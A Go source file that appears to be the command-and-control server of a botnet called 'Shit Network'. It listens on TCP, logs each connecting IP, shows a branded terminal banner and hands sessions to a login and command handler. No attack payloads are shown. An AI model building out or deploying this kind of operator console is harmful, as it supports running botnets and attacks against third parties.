package cnc

import (
	"net"
	"os"
	"os/exec"
	"shitnet/network/config"
	"strconv"
	"sync"

	"github.com/fatih/color"
)

var (
	Conns []net.Conn
)

var wg sync.WaitGroup

func cmd(name string, arg ...string) {
	cmd := exec.Command(name, arg...)
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func cls(conn net.Conn) {
	Print("\x1B[2J\x1B[H", conn)
	Print(color.HiWhiteString("\n\n\n\n\n\n\t\t\t\t    Shit"+color.HiMagentaString(" Network\n\n\n\n\n")), conn)
	CommandManager(conn)
}

func Start() {
	NewCon := make(chan net.Conn)

	server, err := net.Listen("tcp", config.GetConfig().Server+":"+config.GetConfig().Port)
	if err != nil {
		color.HiRed("Fails to start server")
		os.Exit(0)
	}

	go func() {
		for {
			conn, err := server.Accept()
			if err != nil {
				continue
			}
			NewCon <- conn
		}
	}()

	for {
		select {
		case conn := <-NewCon:
			go newuser(conn)

		}
	}

}

func newuser(conn net.Conn) {

	Conns = append(Conns, conn)
	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		Log(" *_🌐 New connection_*||*IP: " + addr.IP.String() + "||Port: " + strconv.Itoa(addr.Port))
	}
	Print("\x1B[2J\x1B[H", conn)
	LoginPage(conn)
	conn.Write([]byte("\033]0;SHIT NETWORK " + "\007"))
	cls(conn)
	CommandManager(conn)

}
